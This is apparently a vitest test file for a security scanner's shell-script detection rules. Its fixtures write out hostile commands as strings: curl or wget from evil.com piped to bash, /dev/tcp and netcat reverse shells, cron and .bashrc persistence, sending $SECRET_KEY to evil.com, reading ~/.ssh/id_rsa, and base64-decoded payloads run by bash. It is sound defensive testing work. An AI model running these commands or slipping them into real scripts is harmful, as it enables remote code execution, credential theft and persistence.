/**
 * Tests for Shell script detection rules
 * Covers RCE, stealth, reverse shells, persistence, exfiltration, encoding
 */

import { describe, it, expect } from 'vitest';
import { applyRule, matchFile } from '../../src/scanner/matcher';
import { shellRules } from '../../src/rules/shell-rules';

function getRule(id: string) {
  const rule = shellRules.find((r) => r.id === id);
  if (!rule) throw new Error(`Rule not found: ${id}`);
  return rule;
}

function expectDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  expect(matchFile(filePath, rule.filePatterns)).toBe(true);
  const findings = applyRule(rule, filePath, content);
  expect(findings.length).toBeGreaterThan(0);
  return findings;
}

function expectNoDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  if (!matchFile(filePath, rule.filePatterns)) return;
  const findings = applyRule(rule, filePath, content);
  expect(findings).toHaveLength(0);
}

// ============================================
// Remote code execution
// ============================================

describe('sh-curl-bash', () => {
  it('detects curl piped to bash', () => {
    expectDetection(
      'sh-curl-bash',
      'install.sh',
      `#!/bin/bash\ncurl https://evil.com/setup.sh | bash`
    );
  });

  it('detects wget piped to sh', () => {
    expectDetection(
      'sh-curl-bash',
      'install.sh',
      `wget http://evil.com/payload | sh`
    );
  });

  it('detects in Makefile', () => {
    expectDetection(
      'sh-curl-bash',
      'Makefile',
      `install:\n\tcurl https://evil.com/setup | bash`
    );
  });

  it('does not flag curl saving to file', () => {
    expectNoDetection(
      'sh-curl-bash',
      'install.sh',
      `curl -o file.tar.gz https://releases.example.com/v1.0.tar.gz`
    );
  });
});

describe('sh-eval-curl', () => {
  it('detects eval with curl subshell', () => {
    expectDetection(
      'sh-eval-curl',
      'install.sh',
      `eval "$(curl -s https://evil.com/payload)"`
    );
  });

  it('detects eval with wget', () => {
    expectDetection(
      'sh-eval-curl',
      'setup.sh',
      `eval $(wget -qO- https://evil.com/script)`
    );
  });
});

// ============================================
// Stealth/hiding
// ============================================

describe('sh-background-nohup', () => {
  it('detects nohup with background', () => {
    expectDetection(
      'sh-background-nohup',
      'persist.sh',
      `nohup ./malware &`
    );
  });

  it('does not flag nohup without background', () => {
    expectNoDetection(
      'sh-background-nohup',
      'run.sh',
      `nohup ./long-task`
    );
  });
});

describe('sh-redirect-null', () => {
  it('detects redirect to /dev/null with stderr', () => {
    expectDetection(
      'sh-redirect-null',
      'stealth.sh',
      `./malware > /dev/null 2>&1`
    );
  });

  it('detects stderr first then /dev/null', () => {
    expectDetection(
      'sh-redirect-null',
      'stealth.sh',
      `command 2>&1 > /dev/null`
    );
  });
});

describe('sh-disown-background', () => {
  it('detects disown command', () => {
    expectDetection(
      'sh-disown-background',
      'persist.sh',
      `./backdoor &\ndisown`
    );
  });
});

// ============================================
// Reverse shells
// ============================================

describe('sh-reverse-shell', () => {
  it('detects /dev/tcp reverse shell', () => {
    expectDetection(
      'sh-reverse-shell',
      'shell.sh',
      `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
    );
  });

  it('detects mkfifo reverse shell', () => {
    expectDetection(
      'sh-reverse-shell',
      'shell.sh',
      `mkfifo /tmp/f; nc -l -p 4444 < /tmp/f | /bin/sh > /tmp/f`
    );
  });

  it('detects nc -e pattern', () => {
    expectDetection(
      'sh-reverse-shell',
      'shell.sh',
      `nc -e /bin/bash 10.0.0.1 4444`
    );
  });

  it('does not flag normal bash script', () => {
    expectNoDetection(
      'sh-reverse-shell',
      'build.sh',
      `#!/bin/bash\necho "Building..."\nmake build`
    );
  });
});

describe('sh-netcat-listen', () => {
  it('detects nc -l', () => {
    expectDetection(
      'sh-netcat-listen',
      'listen.sh',
      `nc -l -p 4444`
    );
  });

  it('detects nc --listen', () => {
    expectDetection(
      'sh-netcat-listen',
      'listen.sh',
      `nc --listen 4444`
    );
  });
});

// ============================================
// Permission and persistence
// ============================================

describe('sh-chmod-executable', () => {
  it('detects chmod +x', () => {
    expectDetection(
      'sh-chmod-executable',
      'setup.sh',
      `chmod +x ./payload`
    );
  });

  it('detects chmod 777', () => {
    expectDetection(
      'sh-chmod-executable',
      'setup.sh',
      `chmod 777 /tmp/evil`
    );
  });

  it('detects chmod 755', () => {
    expectDetection(
      'sh-chmod-executable',
      'setup.sh',
      `chmod 755 script.sh`
    );
  });
});

describe('sh-crontab-modify', () => {
  it('detects crontab modification', () => {
    expectDetection(
      'sh-crontab-modify',
      'persist.sh',
      `crontab -l | echo "* * * * * /tmp/evil" >> /tmp/cron`
    );
  });

  it('detects echo to cron file', () => {
    expectDetection(
      'sh-crontab-modify',
      'persist.sh',
      `echo "0 * * * * /tmp/backdoor" >> /etc/cron.d/job`
    );
  });
});

describe('sh-rc-file-modify', () => {
  it('detects write to .bashrc', () => {
    expectDetection(
      'sh-rc-file-modify',
      'persist.sh',
      `echo "curl evil.com | bash" >> ~/.bashrc`
    );
  });

  it('detects write to .zshrc', () => {
    expectDetection(
      'sh-rc-file-modify',
      'persist.sh',
      `echo "source /tmp/evil" >> ~/.zshrc`
    );
  });

  it('detects write to .profile', () => {
    expectDetection(
      'sh-rc-file-modify',
      'persist.sh',
      `echo "export PATH=/tmp/evil:$PATH" > ~/.profile`
    );
  });
});

// ============================================
// Data exfiltration
// ============================================

describe('sh-env-exfil', () => {
  it('detects access to SECRET env var', () => {
    expectDetection(
      'sh-env-exfil',
      'exfil.sh',
      `curl https://evil.com?s=$SECRET_KEY`
    );
  });

  it('detects PRIVATE env var access', () => {
    expectDetection(
      'sh-env-exfil',
      'exfil.sh',
      `echo $PRIVATE_KEY`
    );
  });

  it('detects AWS credential access', () => {
    expectDetection(
      'sh-env-exfil',
      'exfil.sh',
      `echo $AWS_SECRET_ACCESS_KEY`
    );
  });

  it('does not flag normal variables', () => {
    expectNoDetection(
      'sh-env-exfil',
      'normal.sh',
      `echo $HOME\necho $USER\necho $PATH`
    );
  });
});

describe('sh-ssh-key-access', () => {
  it('detects SSH key access', () => {
    expectDetection(
      'sh-ssh-key-access',
      'steal.sh',
      `cat ~/.ssh/id_rsa`
    );
  });

  it('detects authorized_keys access', () => {
    expectDetection(
      'sh-ssh-key-access',
      'persist.sh',
      `echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys`
    );
  });
});

// ============================================
// Encoding/obfuscation
// ============================================

describe('sh-base64-decode-exec', () => {
  it('detects base64 decode piped to bash', () => {
    expectDetection(
      'sh-base64-decode-exec',
      'payload.sh',
      `echo "cGF5bG9hZA==" | base64 --decode | bash`
    );
  });

  it('detects base64 -d piped to sh', () => {
    expectDetection(
      'sh-base64-decode-exec',
      'payload.sh',
      `echo "payload" | base64 -d | sh`
    );
  });

  it('does not flag base64 encode', () => {
    expectNoDetection(
      'sh-base64-decode-exec',
      'encode.sh',
      `echo "hello" | base64`
    );
  });
});
